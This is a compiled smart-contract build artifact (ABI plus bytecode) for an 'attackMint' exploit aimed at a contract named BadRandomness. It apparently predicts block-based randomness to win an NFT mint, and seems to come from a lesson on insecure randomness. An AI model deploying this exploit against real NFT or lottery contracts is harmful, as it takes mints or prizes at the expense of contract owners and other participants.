{"abi":[{"type":"function","name":"attackMint","inputs":[{"name":"nftAddr","type":"address","internalType":"contract BadRandomness"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5061032c8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063432344b51461002d575b5f5ffd5b61004760048036038101906100429190610169565b610049565b005b5f606460014361005991906101ca565b404260405160200161006c929190610246565b604051602081830303815290604052805190602001205f1c61008e919061029e565b90508173ffffffffffffffffffffffffffffffffffffffff16638726d836826040518263ffffffff1660e01b81526004016100c991906102dd565b5f604051808303815f87803b1580156100e0575f5ffd5b505af11580156100f2573d5f5f3e3d5ffd5b505050505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610127826100fe565b9050919050565b5f6101388261011d565b9050919050565b6101488161012e565b8114610152575f5ffd5b50565b5f813590506101638161013f565b92915050565b5f6020828403121561017e5761017d6100fa565b5b5f61018b84828501610155565b91505092915050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6101d482610194565b91506101df83610194565b92508282039050818111156101f7576101f661019d565b5b92915050565b5f819050919050565b5f819050919050565b61022061021b826101fd565b610206565b82525050565b5f819050919050565b61024061023b82610194565b610226565b82525050565b5f610251828561020f565b602082019150610261828461022f565b6020820191508190509392505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f6102a882610194565b91506102b383610194565b9250826102c3576102c2610271565b5b828206905092915050565b6102d781610194565b82525050565b5f6020820190506102f05f8301846102ce565b9291505056fea26469706673582212205d3c621e6daad24985f48805065ceadb943d31ada951fc15a0718e1c208c962164736f6c63430008220033","linkReferences":{}},"methodIdentifiers":{"attackMint(address)":"432344b5"},"id":127}